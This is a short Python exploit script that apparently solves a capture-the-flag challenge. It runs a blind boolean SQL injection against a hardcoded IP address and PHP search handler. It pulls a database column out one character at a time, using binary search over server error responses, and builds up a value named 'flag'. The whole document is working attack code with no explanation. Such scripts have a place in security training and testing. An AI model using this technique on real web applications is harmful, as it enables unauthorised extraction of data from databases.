import requests


def sqli(pos,mid):
    url = "http://94.237.55.163:37788/Controllers/Handlers/SearchHandler.php" 

    headers = {
        "Transfer-Encoding": "chunked"
    }
    
    data = {
        "search": "6' AND unicode(substr(gamedesc,%i,1))>%i -- -" % (pos,mid)
    }

    r = requests.post(url, data = data, headers = headers)

    return r.status_code != 500

def get_char(pos):
    lo, hi = 32, 128
    while lo <= hi:
        mid = lo + (hi - lo) // 2
        if sqli(pos, mid):
            lo = mid + 1
        else:
            hi = mid - 1
    return chr(lo)

flag = ''
for i in range(1, 15):
    flag += get_char(i)
    print(flag)

